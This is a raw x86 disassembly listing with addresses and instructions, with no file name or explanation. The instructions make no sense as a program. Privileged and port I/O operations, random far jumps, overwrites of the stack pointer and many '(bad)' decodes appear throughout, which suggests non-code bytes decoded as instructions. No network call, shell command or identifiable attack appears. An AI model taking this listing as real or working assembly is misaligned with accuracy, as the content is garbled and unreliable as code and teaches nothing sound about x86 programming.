  525ef1:	mov    eax,0x6bf6bd3b
  525ef6:	adc    BYTE PTR [ebx-0x23],bl
  525ef9:	out    0x49,eax
  525efb:	clc    
  525efc:	mov    dl,0xa5
  525efe:	daa    
  525eff:	cld    
  525f00:	adc    DWORD PTR [eax+ebp*1-0x77],ebx
  525f04:	lods   al,BYTE PTR ds:[esi]
  525f06:	fsubr  st,st(2)
  525f08:	int    0x89
  525f0a:	and    eax,0x1971a4af
  525f0f:	or     eax,ebp
  525f11:	mov    cl,0x4
  525f13:	dec    eax
  525f14:	mov    esp,0x261377ae
  525f19:	and    al,0x8a
  525f1b:	push   edx
  525f1c:	mov    edi,0xb4586bbd
  525f21:	ja     0x525ef2
  525f23:	pop    ss
  525f24:	std    
  525f25:	out    dx,eax
  525f26:	rcr    BYTE PTR [edx+0x7c39f7c9],1
  525f2c:	mov    ebx,0x1d240fea
  525f31:	cmp    DWORD PTR ds:[ebp-0x6dc6fd64],ebx
  525f38:	aaa    
  525f39:	jnp    0x525f33
  525f3b:	pop    edi
  525f3c:	cmp    eax,0x57c27802
  525f41:	ins    DWORD PTR es:[edi],dx
  525f42:	ds sbb eax,0x8bc213b8
  525f48:	mov    cl,0xd1
  525f4a:	cli    
  525f4b:	gs call 0xcf448a6b
  525f51:	or     ch,bh
  525f53:	lea    ecx,[ebx-0x73]
  525f56:	xor    al,0x6d
  525f58:	cmp    al,0x4c
  525f5a:	idiv   DWORD PTR [ebx+eax*1]
  525f5d:	xchg   ebp,eax
  525f5e:	fisubr WORD PTR [ecx]
  525f60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  525f61:	pop    ds
  525f62:	das    
  525f63:	or     cl,BYTE PTR [ecx]
  525f65:	ss sub al,0x4e
  525f68:	fwait
  525f69:	add    ebp,esi
  525f6b:	dec    esi
  525f6c:	jo     0x525f20
  525f6e:	bound  eax,QWORD PTR [edx+eiz*8+0x50]
  525f72:	xchg   DWORD PTR [esi],esi
  525f74:	jmp    0x525fb4
  525f76:	and    al,0xd6
  525f78:	sbb    al,cl
  525f7a:	adc    al,0x15
  525f7c:	and    ecx,DWORD PTR [ecx-0x1824529e]
  525f82:	xchg   esp,eax
  525f83:	retf   
  525f84:	pop    esp
  525f85:	test   eax,0xce2a6fe1
  525f8a:	push   esp
  525f8b:	nop
  525f8c:	jnp    0x525ffe
  525f8e:	jae    0x525f34
  525f90:	add    ah,ah
  525f92:	mov    eax,ds:0x107245aa
  525f97:	add    BYTE PTR [edi+ebx*8+0x6e766e90],0xc
  525f9f:	repnz lea eax,[ebx-0x3e]
  525fa3:	push   ebp
  525fa4:	ins    BYTE PTR es:[edi],dx
  525fa5:	mov    ds:0x135d50b,al
  525faa:	aaa    
  525fab:	addr16 clc 
  525fad:	popf   
  525fae:	nop
  525faf:	adc    eax,0xd052acf8
  525fb4:	add    esp,DWORD PTR [ebx+edi*1]
  525fb7:	mov    ecx,DWORD PTR [ecx]
  525fb9:	jb     0x526024
  525fbb:	ins    BYTE PTR es:[edi],dx
  525fbc:	push   esi
  525fbd:	xor    ah,BYTE PTR [ecx]
  525fbf:	add    ch,ah
  525fc1:	(bad)  
  525fc2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  525fc3:	dec    esp
  525fc4:	xchg   ecx,eax
  525fc5:	and    al,0x26
  525fc7:	xchg   esi,eax
  525fc8:	push   0x68c50ee0
  525fcd:	xchg   BYTE PTR [esi-0x684d2916],dl
  525fd3:	popa   
  525fd4:	imul   ecx,DWORD PTR [edi+edx*1+0x7c176aa4],0x3f5d0a57
  525fdf:	jmp    0x525f84
  525fe1:	dec    ebx
  525fe2:	(bad)  
  525fe3:	cli    
  525fe4:	sbb    ah,BYTE PTR [ecx]
  525fe6:	pop    edi
  525fe7:	mov    ebx,0x6c388791
  525fec:	sub    esi,DWORD PTR [edi+ebx*1]
  525fef:	xor    esi,ebp
  525ff1:	fcomp  QWORD PTR [edi]
  525ff3:	rcr    DWORD PTR [eax],cl
  525ff5:	(bad)  
  525ff6:	das    
  525ff7:	sbb    ebp,esi
  525ff9:	mov    bh,0xaa
  525ffb:	sbb    BYTE PTR [ecx-0x4f],ch
  525ffe:	rcr    ch,cl
  526000:	shl    edi,1
  526002:	retf   0x5ff2
  526005:	test   BYTE PTR [ecx],ch
  526007:	cld    
  526008:	push   ds
  526009:	enter  0xdf5f,0xb1
  52600d:	lods   eax,DWORD PTR gs:[esi]
  52600f:	fldenv [esi-0x25a79f7f]
  526015:	jae    0x526009
  526017:	pop    esi
  526018:	shl    BYTE PTR [ebx],cl
  52601a:	pusha  
  52601b:	mov    DWORD PTR [edi-0x5e],edx
  52601e:	mov    bh,BYTE PTR [edx-0x5a]
  526021:	loopne 0x525ff6
  526023:	and    eax,0x320b38bb
  526028:	push   ds
  526029:	cli    
  52602a:	mov    dl,0x9e
  52602c:	jmp    0x9535:0x9d285ca9
  526033:	adc    ch,BYTE PTR [ecx+0x59]
  526036:	lds    eax,FWORD PTR [edx-0x4b0fd34]
  52603c:	jbe    0x52606b
  52603e:	int3   
  52603f:	sbb    ch,BYTE PTR [eax-0x62cfe427]
  526045:	loope  0x526030
  526047:	inc    eax
  526048:	fbld   TBYTE PTR [edi]
  52604a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  52604b:	push   cs
  52604c:	fwait
  52604d:	mov    ds:0x7154a4ea,al
  526052:	mov    edx,0x6fb61a31
  526057:	jl     0x526005
  526059:	xchg   ebx,eax
  52605a:	fbld   TBYTE PTR [esi+0x59a40ee5]
  526060:	outs   dx,DWORD PTR ds:[esi]
  526061:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  526062:	sub    BYTE PTR [edi+0x62],bl
  526065:	pop    eax
  526066:	inc    ebp
  526067:	pop    ebx
  526068:	mov    bh,0x39
  52606a:	mov    ?,WORD PTR [eax+0x4c9e4b72]
  526070:	sub    eax,0xdc3977ac
  526075:	icebp  
  526076:	(bad)  
  526077:	stos   BYTE PTR es:[edi],al
  526078:	jbe    0x526046
  52607a:	daa    
  52607b:	xchg   ecx,eax
  52607c:	push   ebx
  52607d:	scas   eax,DWORD PTR es:[edi]
  52607e:	mov    es,WORD PTR [esi]
  526080:	push   es
  526081:	mov    esi,0x6e4873da
  526086:	test   eax,esp
  526088:	enter  0x84d2,0x3a
  52608c:	xlat   BYTE PTR ds:[ebx]
  52608d:	or     bh,ch
  52608f:	inc    eax
  526090:	jl     0x52608f
  526092:	ror    DWORD PTR [edi+0x71],0x7
  526096:	pop    edx
  526097:	add    DWORD PTR [eax+0x71],ebx
  52609a:	or     eax,DWORD PTR [ecx]
  52609c:	mov    dl,0x63
  52609e:	inc    esp
  52609f:	jns    0x526105
  5260a1:	or     eax,0x51d5de6c
  5260a6:	mov    esp,0x963e8085
  5260ab:	pushf  
  5260ac:	icebp  
  5260ad:	add    dl,BYTE PTR [edi-0x2d]
  5260b0:	mov    ds:0x47b680eb,eax
  5260b5:	sub    eax,0xe4117826
  5260ba:	add    ch,BYTE PTR [eax-0x4f]
  5260bd:	push   esp
  5260be:	retf   
  5260bf:	or     eax,0x4bc549c1
  5260c4:	sbb    eax,0x5fbdccab
  5260c9:	jbe    0x5260da
  5260cb:	or     ah,BYTE PTR [edx*8+0x7acfc95a]
  5260d2:	pop    esi
  5260d3:	fist   DWORD PTR [ecx+0x6fcf880a]
  5260d9:	fdivr  QWORD PTR [edi-0x179ff6a]
  5260df:	imul   eax,DWORD PTR [ecx],0x64
  5260e2:	pop    edi
  5260e3:	jmp    0xf8c509df
  5260e8:	in     al,dx
  5260e9:	inc    esi
  5260ea:	enter  0xa3cf,0xa4
  5260ee:	icebp  
  5260ef:	scas   eax,DWORD PTR es:[edi]
  5260f0:	(bad)  
  5260f1:	or     bh,ch
  5260f3:	inc    esi
  5260f4:	push   ss
  5260f5:	dec    ebp
  5260f6:	and    eax,0x929a83b4
  5260fb:	and    eax,0x3e6adfe9
  526100:	sub    al,0xf
  526102:	test   BYTE PTR [ebx],bh
  526104:	add    eax,0xe7001b0
  526109:	xlat   BYTE PTR ds:[ebx]
  52610a:	rcl    dh,cl
  52610c:	popa   
  52610d:	retf   
  52610e:	xor    eax,0x9cb8bec6
  526113:	and    al,0x82
  526115:	pop    ebp
  526116:	push   eax
  526117:	or     cl,BYTE PTR [si-0x1e]
  52611b:	mov    esp,0xfc593005
  526120:	mov    ebp,0xaaa2ad24
  526125:	jp     0x526197
  526127:	push   0x73e42e04
  52612c:	xor    al,BYTE PTR [ecx-0x6168254]
  526132:	fadd   DWORD PTR [edi+edx*1-0x29]
  526136:	mov    ah,0x9c
  526138:	sbb    edx,DWORD PTR [ecx]
  52613a:	stos   DWORD PTR es:[edi],eax
  52613b:	inc    edx
  52613c:	sub    ah,bl
  52613e:	arpl   cx,sp
  526140:	xlat   BYTE PTR ds:[ebx]
  526141:	mov    bl,0x51
  526143:	inc    esi
  526144:	jle    0x526115
  526146:	sbb    DWORD PTR [eax],esi
  526148:	rep lods al,BYTE PTR ds:[esi]
  52614a:	mov    dl,0xb5
  52614c:	or     esp,ecx
  52614e:	xchg   DWORD PTR [ebx-0x53bef823],eax
  526154:	jle    0x526133
  526156:	out    dx,al
  526157:	fiadd  WORD PTR [ebx+0x613e6153]
  52615d:	jb     0x52616b
  52615f:	fstp   QWORD PTR [eax-0x49c9b3b7]
  526165:	addr16 (bad) 
  526167:	cmc    
  526168:	push   0x8
  52616a:	outs   dx,DWORD PTR ds:[esi]
  52616b:	jl     0x5261ec
  52616d:	jnp    0x526136
  52616f:	jl     0x5261b3
  526171:	sub    ecx,DWORD PTR [edi+0xd]
  526174:	into   
  526175:	in     eax,dx
  526176:	js     0x526189
  526178:	sbb    dl,ch
  52617a:	jp     0x526142
  52617c:	pop    ecx
  52617d:	add    esp,DWORD PTR [edx]
  52617f:	retf   
  526180:	and    BYTE PTR [eax],dh
  526182:	in     al,dx
  526183:	adc    DWORD PTR [ebp-0x1d],esp
  526186:	pop    eax
  526187:	pop    es
  526188:	jge    0x526137
  52618a:	icebp  
  52618b:	xchg   bh,al
  52618d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  52618e:	jbe    0x526185
  526190:	lods   eax,DWORD PTR ds:[esi]
  526191:	retf   0x3b4
  526194:	cmp    cl,al
  526196:	or     dh,bh
  526198:	and    eax,DWORD PTR [ebx]
  52619a:	and    al,0x52
  52619c:	mov    BYTE PTR [ecx],ah
  52619e:	fisub  DWORD PTR [ebx]
  5261a0:	out    0xfd,eax
  5261a2:	sub    BYTE PTR [ebx-0x10],ch
  5261a5:	(bad)  
  5261a6:	push   cs
  5261a7:	jl     0x5261fb
  5261a9:	jbe    0x5261ae
  5261ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  5261ac:	sub    DWORD PTR [edx+0x29],eax
  5261af:	pop    ebp
  5261b0:	push   es
  5261b1:	pop    es
  5261b2:	ror    DWORD PTR [ebp+ebp*4-0x3c3c4800],cl
  5261b9:	arpl   WORD PTR [ebx-0x14],bx
  5261bc:	dec    edi
  5261bd:	std    
  5261be:	scas   al,BYTE PTR es:[edi]
  5261bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  5261c0:	test   al,0x23
  5261c2:	aam    0xd6
  5261c4:	(bad)  
  5261c5:	mov    esi,0xffbd9421
  5261ca:	imul   cl
  5261cc:	loop   0x5261f2
  5261ce:	mov    esi,0x62e8aecb
  5261d3:	fwait
  5261d4:	dec    esp
  5261d5:	sbb    al,0xfd
  5261d7:	aad    0x71
  5261d9:	test   al,0xfa
  5261db:	cmp    BYTE PTR [edi-0x73],ch
  5261de:	sub    ebp,DWORD PTR [edi-0x56]
  5261e1:	xchg   ebp,eax
  5261e2:	or     esp,DWORD PTR [ecx]
  5261e4:	iret   
  5261e5:	test   al,ah
  5261e7:	(bad)  
  5261e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  5261e9:	xchg   ebx,eax
  5261ea:	add    al,bl
  5261ec:	aam    0x56
  5261ee:	push   edi
  5261ef:	adc    esp,DWORD PTR [esi-0x390c26b4]
  5261f5:	pusha  
  5261f6:	lods   eax,DWORD PTR es:[esi]
  5261f8:	stc    
  5261f9:	ins    DWORD PTR es:[edi],dx
  5261fa:	js     0x526184
  5261fc:	stc    
  5261fd:	dec    esp
  5261fe:	mov    bh,0xa0
  526200:	adc    al,0x7a
  526202:	xchg   esp,eax
  526203:	mov    ds:0x8074fdf3,al
  526208:	sahf   
  526209:	test   BYTE PTR [ecx+ebp*2+0x25],bl
  52620d:	push   0xd483d357
  526212:	out    dx,eax
  526213:	xchg   ecx,eax
  526214:	pop    ss
  526215:	or     DWORD PTR [ebp-0xe6c2ecb],edx
  52621b:	add    esi,DWORD PTR [esi]
  52621d:	add    al,0x96
  52621f:	call   0x5d76:0x97479e15
  526226:	add    esp,esp
  526228:	inc    ecx
  526229:	add    ax,0xc7c2
  52622d:	test   BYTE PTR ds:0x23e58024,0x2e
  526234:	jmp    0x4eec97d7
  526239:	dec    esp
  52623a:	or     al,0x4f
  52623c:	addr16 ret 
  52623e:	xchg   edi,eax
  52623f:	inc    ebx
  526240:	mov    al,0x93
  526242:	pushf  
  526243:	rcr    BYTE PTR [edi-0x34],1
  526246:	cmc    
  526247:	imul   BYTE PTR [eax]
  526249:	aaa    
  52624a:	mov    ds:0x46f31bc3,al
  52624f:	cld    
  526250:	aaa    
  526251:	add    eax,esp
  526253:	or     eax,DWORD PTR [eax+edi*2-0x660887b7]
  52625a:	and    al,0xf8
  52625c:	ins    BYTE PTR es:[edi],dx
  52625d:	stos   BYTE PTR es:[edi],al
  52625e:	jb     0x526203
  526260:	adc    cl,BYTE PTR [ecx+eiz*4+0x37]
  526264:	fs jle 0x526236
  526267:	fwait
  526268:	lahf   
  526269:	mov    dh,0x1
  52626b:	lods   al,BYTE PTR ds:[esi]
  52626c:	gs cli 
  52626e:	xchg   BYTE PTR [eax],bh
  526270:	push   ecx
  526271:	lods   eax,DWORD PTR ds:[esi]
  526272:	aam    0x7e
  526274:	push   edx
  526275:	push   eax
  526276:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  526277:	xchg   edx,eax
  526278:	test   al,0x74
  52627a:	adc    DWORD PTR [edi-0xa],edi
  52627d:	push   esi
  52627e:	addr16 inc ecx
  526280:	rol    BYTE PTR [edx+0x6e],0x36
  526284:	loope  0x52627c
  526286:	xor    BYTE PTR [esi-0x1c],dh
  526289:	unpcklps xmm7,XMMWORD PTR [ebx]
  52628c:	add    dh,BYTE PTR [ebp+0x4d278cc4]
  526292:	gs out 0x47,eax
  526295:	and    BYTE PTR [eax+0x1f],cl
  526298:	das    
  526299:	or     eax,0x880acb50
  52629e:	push   ds
  52629f:	jmp    0x5262c1
  5262a1:	mov    ds:0x4d7f7d05,eax
  5262a6:	loop   0x52631c
  5262a8:	pusha  
  5262a9:	and    BYTE PTR cs:[edi],0xbd
  5262ad:	pop    esi
  5262ae:	jnp    0x52626c
  5262b0:	sbb    al,0x3b
  5262b2:	stc    
  5262b3:	enter  0xe801,0xf7
  5262b7:	mov    DWORD PTR [eax*1-0x53498be5],ebp
  5262be:	adc    cl,bl
  5262c0:	pop    ebp
  5262c1:	adc    eax,ecx
  5262c3:	inc    ebp
  5262c4:	rcl    DWORD PTR [ecx],1
  5262c6:	repnz or edx,DWORD PTR [eax]
  5262c9:	add    eax,0x3c03f432
  5262ce:	aad    0x92
  5262d0:	mov    dl,0xa5
  5262d2:	mov    al,ds:0x316b6370
  5262d7:	fs adc eax,0x3d4fa1b1
  5262dd:	inc    ecx
  5262de:	sbb    ecx,ebp
  5262e0:	leave  
  5262e1:	std    
  5262e2:	pop    ebp
  5262e3:	icebp  
  5262e4:	pop    esi
  5262e5:	rcr    DWORD PTR [edx-0x18],0x88
  5262e9:	push   eax
  5262ea:	pop    ebp
  5262eb:	bound  esp,QWORD PTR [esi-0x644591d9]
  5262f1:	in     al,0x6
  5262f3:	retf   
  5262f4:	lods   al,BYTE PTR ds:[esi]
  5262f5:	inc    esp
  5262f6:	dec    edx
  5262f7:	neg    edi
  5262f9:	push   0xbd22f7aa
  5262fe:	adc    BYTE PTR [ebx],cl
  526300:	inc    ecx
  526301:	sti    
  526302:	imul   ebx,DWORD PTR [ebp-0x1b508d15],0xce90bf9a
  52630c:	mov    fs,WORD PTR [ebx+ecx*1-0x7b27d18b]
  526313:	and    al,0x97
  526315:	pop    eax
  526316:	fwait
  526317:	fwait
  526318:	xchg   BYTE PTR [eax+ecx*8-0x48],al
  52631c:	adc    al,0x46
  52631e:	pop    ebx
  52631f:	sbb    al,0x4f
  526321:	scas   al,BYTE PTR es:[edi]
  526322:	arpl   WORD PTR [esi-0xd],bp
  526325:	jmp    0x69a8:0x59a810aa
  52632c:	je     0x5262fa
  52632e:	jl     0x526387
  526330:	sahf   
  526331:	sub    esi,ebp
  526333:	and    al,0xce
  526335:	sub    eax,0x4fd12f7b
  52633a:	push   ds
  52633b:	xchg   esi,eax
  52633c:	jg     0x526397
  52633e:	aam    0xdf
  526340:	add    dh,dh
  526342:	loop   0x5262d5
  526344:	repz (bad) 
  526346:	cmp    cl,ah
  526348:	jp     0x52632d
  52634a:	enter  0xe902,0x16
  52634e:	pop    ebx
  52634f:	fdivp  st(5),st
  526351:	daa    
  526352:	push   cs
  526353:	arpl   WORD PTR [edi],cx
  526355:	clc    
  526356:	mov    esi,0x30811ab3
  52635b:	jmp    0x5db7:0x8ac4ae8c
  526362:	pop    ebx
  526363:	cwde   
  526364:	mov    ah,0xce
  526366:	and    BYTE PTR [ebp+0x15],al
  526369:	push   ebp
  52636a:	cvttps2pi mm6,QWORD PTR [eax+ebx*4-0xf]
  52636f:	pop    ecx
  526370:	aas    
  526371:	and    cl,BYTE PTR [edx+0x6de168c1]
  526377:	mov    edx,0x902c58d8
  52637c:	pop    esp
  52637d:	lds    esp,FWORD PTR [edx]
  52637f:	jno    0x5263e7
  526381:	and    eax,0x56b5be2e
  526386:	out    0xa3,eax
  526388:	sbb    DWORD PTR [esi+0x72],edi
  52638b:	clc    
  52638c:	inc    edi
  52638d:	fistp  WORD PTR [edi-0x33386596]
  526393:	mov    WORD PTR [ebp+ecx*4-0x46fdd306],gs
  52639a:	push   eax
  52639b:	pop    edx
  52639c:	xchg   ecx,eax
  52639d:	popf   
  52639e:	xchg   esp,eax
  52639f:	in     eax,dx
  5263a0:	mov    ch,0x70
  5263a2:	or     eax,0x4c3d09bd
  5263a7:	stc    
  5263a8:	lds    esp,FWORD PTR [esi-0x7d]
  5263ab:	mov    dh,BYTE PTR [ebx+0x75]
  5263ae:	pop    ebx
  5263af:	add    eax,0xa310387f
  5263b4:	xlat   BYTE PTR ds:[ebx]
  5263b5:	fldcw  WORD PTR [edi]
  5263b7:	push   ebp
  5263b8:	bound  esp,QWORD PTR [edx*1+0x23445212]
  5263bf:	ins    BYTE PTR es:[edi],dx
  5263c0:	retf   0xc322
  5263c3:	ja     0x526429
  5263c5:	cmp    ch,BYTE PTR [ebx]
  5263c7:	retf   
  5263c8:	dec    edi
  5263c9:	mov    al,0xb3
  5263cb:	sbb    bl,BYTE PTR [esi]
  5263cd:	mov    esp,cr3
  5263d0:	push   eax
  5263d1:	pop    edx
  5263d2:	shr    ecx,1
  5263d4:	call   0xd279:0x1fa00b29
  5263db:	stos   BYTE PTR es:[edi],al
  5263dc:	xchg   ebp,eax
  5263dd:	popw   ss
  5263df:	out    dx,al
  5263e0:	sub    al,0xf4
  5263e2:	jg     0x5263c6
  5263e4:	aad    0xb3
  5263e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  5263e7:	lods   al,BYTE PTR ds:[esi]
  5263e8:	lds    ebp,FWORD PTR [ecx-0x32e9db44]
  5263ee:	inc    ebx
  5263ef:	jnp    0x526383
  5263f1:	inc    esi
  5263f2:	div    dh
  5263f4:	push   DWORD PTR [ebx-0x437c9432]
  5263fa:	cmp    DWORD PTR [ebp+ecx*8+0x26a970e3],edi
  526401:	add    BYTE PTR [ebx],ah
  526403:	rcl    DWORD PTR ds:0xe8a1676d,1
  526409:	mov    dh,0x22
  52640b:	repnz inc edi
  52640d:	ins    BYTE PTR es:[edi],dx
  52640e:	cmp    al,0xc
  526410:	pop    esp
  526411:	retfw  
  526413:	push   ds
  526414:	jnp    0x52645c
  526416:	rcl    DWORD PTR [ebx-0x48],1
  526419:	xor    edx,ebp
  52641b:	push   edx
  52641c:	std    
  52641d:	or     eax,0x1a5b2df2
  526422:	jge    0x52643c
  526424:	stos   DWORD PTR es:[edi],eax
  526425:	mov    ebp,0xc397bfef
  52642a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  52642b:	aaa    
  52642c:	cdq    
  52642d:	jns    0x5263e5
  52642f:	xor    ebx,DWORD PTR [ebp-0x4b]
  526432:	mov    dl,0x4f
  526434:	call   0x668:0x2d840e57
  52643b:	inc    edx
  52643c:	jno    0x526428
  52643e:	pushf  
  52643f:	push   eax
  526440:	mov    ebx,0xdb3aa6eb
  526445:	mov    esi,cs
  526447:	adc    BYTE PTR [esi-0x25],bl
  52644a:	xchg   ebx,eax
  52644b:	not    BYTE PTR [ebp+0x46]
  52644e:	inc    edx
  52644f:	mov    ds:0x9cfc4223,al
  526454:	(bad)  
  526455:	shl    BYTE PTR [edi-0x6fc7d33a],0x87
  52645c:	sbb    BYTE PTR [edi+0x3f40537b],al
  526462:	test   DWORD PTR [ebp-0x158e16f0],ebx
  526468:	ret    
  526469:	gs hlt 
  52646b:	int    0xef
  52646d:	in     al,dx
  52646e:	fcmovnb st,st(3)
  526470:	jo     0x526484
  526472:	sub    al,0x59
  526474:	repnz xchg ebp,ebp
  526477:	mov    eax,DWORD PTR [esi+0x20f5f684]
  52647d:	inc    esi
  52647e:	sub    al,0xd1
  526480:	dec    edx
  526481:	xor    BYTE PTR [edx],bl
  526483:	xchg   esp,eax
  526484:	popa   
  526485:	mov    ds:0xa64643fc,eax
  52648a:	jmp    0xdfd1:0x9abf0acb
  526491:	nop
  526492:	or     cl,bh
  526494:	loope  0x5264b8
  526496:	sbb    BYTE PTR [edx],0x84
  526499:	cmc    
  52649a:	ins    BYTE PTR es:[edi],dx
  52649b:	and    DWORD PTR [ebx],eax
  52649d:	xchg   esp,eax
  52649e:	jns    0x526472
  5264a0:	xchg   ebx,eax
  5264a1:	(bad)  
  5264a2:	retf   
  5264a3:	sti    
  5264a4:	test   DWORD PTR [ebp-0x5c],esi
  5264a7:	pop    edx
  5264a8:	xchg   edi,eax
  5264a9:	mov    ch,0x45
  5264ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  5264ac:	adc    BYTE PTR [ebp-0x18],al
  5264af:	iret   
  5264b0:	mov    edi,0xf96614cb
  5264b5:	mov    cl,0x53
  5264b7:	aaa    
  5264b8:	imul   ebx,ebx,0xfac95b21
  5264be:	ja     0x526489
  5264c0:	popf   
  5264c1:	stos   DWORD PTR es:[edi],eax
  5264c2:	test   BYTE PTR [eax],0x4
  5264c5:	loopne 0x526521
  5264c7:	cmp    BYTE PTR [edx+0x5e],cl
  5264ca:	jp     0x52651b
  5264cc:	mov    ebx,0xf1e4989
  5264d1:	lds    ebp,FWORD PTR [edx]
  5264d3:	and    BYTE PTR [ecx+0x73],dh
  5264d6:	inc    esi
  5264d7:	inc    ebx
  5264d8:	inc    edi
  5264d9:	std    
  5264da:	jmp    0x7082:0xd515550b
  5264e1:	call   0xcc1c:0x85d9b663
  5264e8:	xor    BYTE PTR [esi+0x76],dl
  5264eb:	sar    DWORD PTR [esi-0x61fc1fc7],cl
  5264f1:	push   ds
  5264f2:	mov    BYTE PTR cs:[edx+0x5d00c199],dh
  5264f9:	rcr    BYTE PTR [ecx],cl
  5264fb:	sbb    ch,BYTE PTR [eax-0x75]
  5264fe:	ret    0xab90
  526501:	mov    cl,0xbd
  526503:	inc    ecx
  526504:	aas    
  526505:	pop    ecx
  526506:	xchg   esp,eax
  526507:	adc    esp,ebx
  526509:	mov    ebx,0x38a25e85
  52650e:	sub    DWORD PTR [ecx*8-0x1e77f008],ecx
  526515:	mov    ?,WORD PTR [edx+0x3d34f296]
  52651b:	mov    bh,0x34
  52651d:	jmp    0x53cc:0xe9b54def
  526524:	dec    ebx
  526525:	jle    0x52651d
  526527:	xor    BYTE PTR [edx],dh
  526529:	mov    bh,0x6a
  52652b:	dec    ebp
  52652c:	lds    ecx,FWORD PTR [ebx]
  52652e:	bound  edx,QWORD PTR ds:0x9ef67410
  526534:	jle    0x526551
  526536:	aad    0x34
  526538:	sub    eax,0x2f900967
  52653d:	sub    al,0x2
  52653f:	call   0xc88b0a72
  526544:	jno    0x5264dc
  526546:	les    edx,FWORD PTR [esi]
  526548:	or     eax,0xefda3994
  52654d:	mov    edx,0xd9e13f5c
  526552:	das    
  526553:	dec    edx
  526554:	sub    ecx,eax
  526556:	mov    al,0xe1
  526558:	popa   
  526559:	push   eax
  52655a:	or     DWORD PTR [ebp-0x71],0x5e
  52655e:	and    eax,DWORD PTR [ebx]
  526560:	mov    esi,0x4575d44c
  526565:	push   eax
  526566:	xor    BYTE PTR [ebp+0x4afd1635],dl
  52656c:	sub    bl,BYTE PTR [ebx]
  52656e:	fidiv  DWORD PTR [esi+0x54]
  526571:	pop    edi
  526572:	mov    al,BYTE PTR [ecx+eax*4-0x56]
  526576:	or     DWORD PTR es:[ebx+edx*1],eax
  52657a:	fistp  WORD PTR [esi+0x66]
  52657d:	aaa    
  52657e:	mov    ah,0xb8
  526580:	sub    dl,al
  526582:	mov    cl,0x36
  526584:	lods   al,BYTE PTR ds:[esi]
  526585:	stos   DWORD PTR es:[edi],eax
  526586:	cmp    DWORD PTR [esi-0x41],edx
  526589:	mov    cs,WORD PTR [eax+0x655a6cdf]
  52658f:	sahf   
  526590:	stc    
  526591:	pop    esp
  526592:	jne    0x5265e2
  526594:	enter  0x8025,0x98
  526598:	jecxz  0x52657d
  52659a:	fst    QWORD PTR [ecx-0x1a]
  52659d:	sub    eax,0xd2569164
  5265a2:	xor    BYTE PTR [esi],al
  5265a4:	add    dl,ah
  5265a6:	mov    al,0x67
  5265a8:	push   eax
  5265a9:	mov    dh,0x87
  5265ab:	inc    edx
  5265ac:	sub    esi,0x23
  5265af:	int3   
  5265b0:	inc    eax
  5265b1:	push   ecx
  5265b2:	mov    eax,ds:0x875ad809
  5265b7:	lds    esp,FWORD PTR [ebx]
  5265b9:	inc    esp
  5265ba:	jo     0x5265de
  5265bc:	jle    0x526638
  5265be:	fdiv   DWORD PTR [eax-0x40]
  5265c1:	or     al,0x88
  5265c3:	es cmp edx,eax
  5265c6:	les    edx,FWORD PTR [eax]
  5265c8:	sar    DWORD PTR [esi+0x773bd33d],1
  5265ce:	inc    edx
  5265cf:	xchg   ecx,ebx
  5265d1:	xor    BYTE PTR [edx+0xb2a8515],bl
  5265d7:	jb     0x526568
  5265d9:	das    
  5265da:	fidivr DWORD PTR [edx-0x23]
  5265dd:	gs sub eax,0xb16801f8
  5265e3:	add    esi,eax
  5265e5:	pop    ss
  5265e6:	and    al,0x11
  5265e8:	ret    0x23e2
  5265eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  5265ec:	call   0x8d6c:0x477ace59
  5265f3:	out    0x48,al
  5265f5:	and    eax,0x2df5d030
  5265fa:	xor    al,0x8f
  5265fc:	mov    ch,dh
  5265fe:	jmp    0xb714:0x3a562256
  526605:	jnp    0x5265f3
  526607:	(bad)  
  526608:	jmp    0x1725607c
  52660d:	lds    ebx,FWORD PTR [ebx-0x52]
  526610:	lahf   
  526611:	mov    dl,0x1d
  526613:	jne    0x5265cb
  526615:	cmp    BYTE PTR [esi-0x6f172f3e],bl
  52661b:	cdq    
  52661c:	std    
  52661d:	inc    ebp
  52661e:	dec    esi
  52661f:	lods   eax,DWORD PTR ds:[esi]
  526620:	retf   
  526621:	add    edx,edx
  526623:	inc    esi
  526624:	inc    esi
  526625:	mov    eax,ds:0xcb2fa322
  52662a:	jl     0x526604
  52662c:	ss and eax,0x6bd9f0d7
  526632:	test   ebp,edi
  526634:	push   ebx
  526635:	cld    
  526636:	cmc    
  526637:	outs   dx,DWORD PTR ds:[esi]
  526638:	push   cs
  526639:	push   esp
  52663a:	inc    ebp
  52663b:	xchg   edi,eax
  52663c:	scas   eax,DWORD PTR es:[edi]
  52663d:	cmp    al,0x29
  52663f:	add    cl,BYTE PTR [esi+0xac162e]
  526645:	stos   DWORD PTR es:[edi],eax
  526646:	retf   0xf27a
  526649:	or     eax,0x83c3902c
  52664e:	aaa    
  52664f:	int    0x8c
  526651:	lods   eax,DWORD PTR ds:[esi]
  526652:	mov    cl,0xc9
  526654:	test   eax,0x44bdc434
  526659:	scas   al,BYTE PTR es:[edi]
  52665a:	pop    esi
  52665b:	push   ebp
  52665c:	fs xor eax,0xf2b0e75a
  526662:	cwde   
  526663:	(bad)  
  526664:	aas    
  526665:	and    BYTE PTR [eax+0x36d02e2b],dh
  52666b:	jno    0x526671
  52666d:	shr    ah,cl
  52666f:	nop
  526670:	inc    edx
  526671:	pop    edi
  526672:	test   DWORD PTR [ebx-0x2e3b1014],edx
  526678:	(bad)  
  526679:	pop    esp
  52667a:	hlt    
  52667b:	or     BYTE PTR [ebp-0x76],cl
  52667e:	retf   
  52667f:	push   ss
  526680:	mov    al,0x62
  526682:	push   eax
  526683:	sub    eax,0x3b9e57cb
  526688:	ja     0x526612
  52668a:	ja     0x526623
  52668c:	jns    0x526674
  52668e:	imul   esp,DWORD PTR [edi+eax*2],0x41
  526692:	adc    DWORD PTR ds:0x438f47b6,ebx
  526698:	and    eax,0x5ca8d6f2
  52669d:	imul   esp,eax,0x487dcd70
